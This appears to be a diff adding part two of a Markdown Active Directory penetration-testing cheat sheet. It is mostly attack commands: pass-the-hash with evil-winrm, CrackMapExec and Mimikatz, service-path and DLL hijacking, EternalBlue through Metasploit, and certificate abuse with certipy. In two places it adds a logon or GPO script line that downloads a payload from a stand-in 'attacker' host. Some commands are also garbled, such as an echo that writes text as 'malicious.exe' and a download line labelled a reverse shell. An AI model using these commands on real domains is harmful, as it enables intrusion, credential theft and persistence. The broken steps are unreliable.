@@ -125,3 +125,146 @@ This document outlines **initial access techniques for Active Directory (AD) pen
 - **Techniques:**
   - **Modify existing GPO script:**
     - `echo 'powershell -c Invoke-WebRequest -Uri http://attacker/payload.exe -OutFile C:\temp\payload.exe' >> login.bat`
+    - 
+
+
+
+
+# **Active Directory Pentesting: Initial Access & Exploitation (Part 2)**
+
+## **Scenario:**
+This document outlines **exploitation techniques for Active Directory (AD) penetration testing**, focusing on **leveraging credentials, executing remote code, and establishing initial access**. The goal is to **gain a shell or higher privileges within the domain**.
+
+### **References for Further Study:**
+- **MITRE ATT&CK – Execution & Privilege Escalation (T1059, T1078, T1086, T1548)**
+- **BloodHound & CrackMapExec for Lateral Movement**
+- **Windows Privilege Escalation (Token Manipulation, Service Abuse, Scheduled Tasks)**
+- **Impacket, Mimikatz, Rubeus, Evil-WinRM for Post-Exploitation**
+
+---
+
+# **🛠 Step 4: Initial Access & Exploitation**
+**Objective:** Obtain **a foothold in the AD environment via credentials, remote execution, or exploit-based techniques**.
+
+## **4.1 Leveraging Credentials for Initial Access**
+
+### **Using Valid Credentials for Remote Access**
+- **Why?** If valid credentials have been obtained, they can be used to access multiple services.
+- **Techniques:**
+  - **WinRM (Remote PowerShell Execution):**
+    ```powershell
+    evil-winrm -i <DC_IP> -u <user> -p <password>
+    ```
+  - **SMB Access:**
+    ```bash
+    smbclient -U <user>%<password> //<DC_IP>/C$
+    ```
+  - **RDP Login (GUI-Based Access):**
+    ```powershell
+    xfreerdp /u:<user> /p:<password> /v:<DC_IP>
+    ```
+- **Alternative Methods:**
+  - **Using CrackMapExec to verify credential access:**
+    ```bash
+    cme smb <DC_IP> -u <user> -p <password>
+    ```
+  - **Using Metasploit for RDP brute-force login:**
+    ```bash
+    use auxiliary/scanner/rdp/rdp_login
+    ```
+
+### **Pass-the-Hash (PTH) for Direct Authentication**
+- **Why?** If NTLM hashes were obtained, they can be used instead of passwords.
+- **Techniques:**
+  - **Authenticate using Pass-the-Hash (Evil-WinRM):**
+    ```powershell
+    evil-winrm -i <DC_IP> -u <user> -H <NTLM_HASH>
+    ```
+  - **Execute commands with CrackMapExec:**
+    ```bash
+    cme smb <DC_IP> -u <user> -H <NTLM_HASH> --exec "whoami"
+    ```
+- **Alternative Methods:**
+  - **Using Mimikatz to inject NTLM hash:**
+    ```powershell
+    sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
+    ```
+
+---
+
+## **4.2 Exploiting Remote Code Execution (RCE)**
+
+### **Abusing Weakly Configured Service Accounts**
+- **Why?** Service accounts often have misconfigurations that allow exploitation.
+- **Techniques:**
+  - **Finding weak service account permissions:**
+    ```powershell
+    Get-NetUserSPNs -UserName <service_account>
+    ```
+  - **Exploiting Unquoted Service Paths:**
+    ```powershell
+    sc qc <service_name>
+    ```
+    ```powershell
+    echo "malicious.exe" > C:\Program Files\Vulnerable Service\malicious.exe
+    ```
+  - **DLL Hijacking via Misconfigured Services:**
+    ```powershell
+    New-Item C:\Windows\System32\evil.dll -ItemType File
+    ```
+- **Alternative Methods:**
+  - **Use Metasploit `exploit/windows/smb/psexec` to gain remote access.**
+  - **Upload a malicious DLL to a writable system path and restart the service.**
+
+### **Exploiting MS17-010 (EternalBlue) for Remote Shell**
+- **Why?** Some older environments may still be vulnerable to EternalBlue.
+- **Techniques:**
+  - **Scan for MS17-010 vulnerability:**
+    ```bash
+    nmap -p 445 --script=smb-vuln-ms17-010 <DC_IP>
+    ```
+  - **Exploit with Metasploit:**
+    ```bash
+    use exploit/windows/smb/ms17_010_eternalblue
+    ```
+- **Alternative Methods:**
+  - **Use `exploit/windows/smb/ms08_067_netapi` for legacy Windows servers.**
+  - **Use `crackmapexec` to test for SMB execution privileges.**
+
+---
+
+## **4.3 Abusing Active Directory Features for Persistence**
+
+### **Modifying Group Policy Objects (GPOs) for Persistent Access**
+- **Why?** GPOs control user policies and can be modified for persistence.
+- **Techniques:**
+  - **List accessible GPOs:**
+    ```powershell
+    Get-NetGPO -ComputerName <DC_IP>
+    ```
+  - **Modify a GPO to execute a reverse shell:**
+    ```powershell
+    echo 'powershell -c Invoke-WebRequest -Uri http://attacker/payload.exe -OutFile C:\Windows\temp\payload.exe' >> script.bat
+    ```
+- **Alternative Methods:**
+  - **Modify logon scripts in SYSVOL to execute payloads.**
+  - **Backdoor registry keys for persistent execution.**
+
+### **Leveraging Shadow Credentials for Privilege Escalation**
+- **Why?** Shadow credentials allow attackers to forge authentication requests.
+- **Techniques:**
+  - **Identify shadow credentials using `certipy`:**
+    ```bash
+    certipy-ad find -u <user> -p <password>
+    ```
+  - **Abuse certificate services to gain higher privileges:**
+    ```bash
+    certipy-ad request -u <user> -p <password> -dc-ip <DC_IP>
+    ```
+- **Alternative Methods:**
+  - **Use Rubeus to interact with shadow credentials.**
+  - **Modify `AdminSDHolder` for persistence.**
+
+---
+
+
